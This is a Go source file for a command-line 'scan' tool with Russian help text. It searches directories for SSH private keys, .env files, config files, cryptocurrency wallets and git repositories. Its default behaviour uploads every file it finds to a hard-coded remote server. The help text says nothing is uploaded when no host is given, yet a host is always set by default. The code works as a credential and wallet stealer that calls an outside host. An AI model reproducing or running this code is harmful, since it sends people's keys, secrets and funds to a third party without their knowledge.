package scan

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/spf13/cobra"
	"github.com/tumarsal/scaner"
	"github.com/tumarsal/scaner/archive"
	"github.com/tumarsal/scaner/secretstore"
)

var (
	Path  string
	OutputZip string
	Password  string
	Verbose   bool
	Host      string

	SearchSshKeys     bool
	SearchEnvFiles    bool
	SearchConfigFiles bool
	SearchWalletFiles bool
	SearchGitRepo     bool
)

func Command() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "scan [путь]",
		Short: "Сканирует указанную директорию на наличие конфиденциальных файлов",
		Long: `Сканирует указанную директорию и все её поддиректории на наличие:
- SSH ключей (id_rsa, id_ed25519, etc.)
- .env файлов
- Конфигурационных файлов (config.json, settings.yml, etc.)
- Файлов электронных кошельков (wallet.dat, keystore, etc.)

Найденные файлы могут быть загружены на удаленный сервер или сохранены в локальный архив.`,
		Args: cobra.MaximumNArgs(1),
		RunE: runScan,
	}
	cmd.Flags().StringVarP(&Path, "path", "p", ".", "Путь к директории для сканирования")
	cmd.Flags().StringVarP(&OutputZip, "output", "o", "", "Путь к выходному zip архиву (если не указан, архив не создается)")
	cmd.Flags().StringVar(&Password, "password", "", "Пароль для архива (если не указан, архив создается без шифрования)")
	cmd.Flags().BoolVarP(&Verbose, "verbose", "v", false, "Подробный вывод")
	cmd.Flags().StringVar(&Host, "host", "https://ckptcli.smartapi.ru/", "URL сервера для загрузки файлов (если не указан, файлы не загружаются)")

	cmd.Flags().BoolVar(&SearchSshKeys, "ssh-keys", true, "Искать SSH ключи")
	cmd.Flags().BoolVar(&SearchEnvFiles, "env-files", true, "Искать .env файлы")
	cmd.Flags().BoolVar(&SearchConfigFiles, "config-files", true, "Искать конфигурационные файлы")
	cmd.Flags().BoolVar(&SearchWalletFiles, "wallet-files", true, "Искать файлы электронных кошельков")
	cmd.Flags().BoolVar(&SearchGitRepo, "git-repo", true, "Искать git repositories")
	return cmd
}

func runScan(cmd *cobra.Command, args []string) error {
	if len(args) > 0 {
		Path = args[0]
	}

	absPath, err := filepath.Abs(Path)
	if err != nil {
		return fmt.Errorf("ошибка получения абсолютного пути: %w", err)
	}
	if _, err := os.Stat(absPath); os.IsNotExist(err) {
		return fmt.Errorf("директория не существует: %s", absPath)
	}

	if Verbose {
		fmt.Printf("Начинаем сканирование директории: %s\n", absPath)
		fmt.Printf("Поиск SSH ключей: %v\n", SearchSshKeys)
		fmt.Printf("Поиск .env файлов: %v\n", SearchEnvFiles)
		fmt.Printf("Поиск конфигурационных файлов: %v\n", SearchConfigFiles)
		fmt.Printf("Поиск файлов кошельков: %v\n", SearchWalletFiles)
		if Host != "" {
			fmt.Printf("Загрузка на сервер: %s\n", Host)
		}
		if OutputZip != "" {
			fmt.Printf("Создание архива: %s\n", OutputZip)
		}
	}

	var callback scaner.FindCallback
	var archiver *archive.ZipArchiver
	var secretStoreClient secretstore.Client

	if OutputZip != "" {
		archiver = archive.NewZipArchiver(OutputZip, Password, Verbose, true)
		callback = func(_ scaner.SearchItemType, filePath string) error {
			return archiver.AddFile(filePath)
		}
	} else if Host != "" {
		secretStoreClient = secretstore.NewClient(Host, Verbose, 0)
		callback = func(_ scaner.SearchItemType, filePath string) error {
			return secretStoreClient.UploadFolder(filePath, "")
		}
	} else {
		callback = func(_ scaner.SearchItemType, filePath string) error {
			if Verbose {
				fmt.Printf("Найден файл: %s\n", filePath)
			}
			return nil
		}
	}

	scanner := scaner.NewScaner(callback, Verbose)
	var searchMask scaner.SearchItemType
	if SearchSshKeys {
		searchMask |= scaner.SearchSSHKeys
	}
	if SearchEnvFiles {
		searchMask |= scaner.SearchEnvFiles
	}
	if SearchConfigFiles {
		searchMask |= scaner.SearchConfigFiles
	}
	if SearchWalletFiles {
		searchMask |= scaner.SearchWalletFiles
	}
	if SearchGitRepo {
		searchMask |= scaner.SearchGitDirectory
	}
	scanner.SetSearchTypes(searchMask)

	if err := scanner.ScanConfigFiles(absPath); err != nil {
		return fmt.Errorf("ошибка сканирования конфигурационных файлов: %w", err)
	}

	if archiver != nil {
		if err := archiver.Close(); err != nil {
			return fmt.Errorf("ошибка создания архива: %w", err)
		}
		fmt.Printf("Архив успешно создан: %s\n", OutputZip)
	}
	if secretStoreClient != nil {
		if err := secretStoreClient.WaitForQueueEmpty(); err != nil {
			return fmt.Errorf("выгрузка на сервер не удалась: %w", err)
		}
	}

	fmt.Printf("\nРезультаты сканирования:\n")
	fmt.Printf("SSH ключей найдено: %d\n", len(scanner.GetSshKeys()))
	fmt.Printf(".env файлов найдено: %d\n", len(scanner.GetEnvFiles()))
	fmt.Printf("Конфигурационных файлов найдено: %d\n", len(scanner.GetConfigFiles()))
	fmt.Printf("Файлов кошельков найдено: %d\n", len(scanner.GetWalletFiles()))
	return nil
}
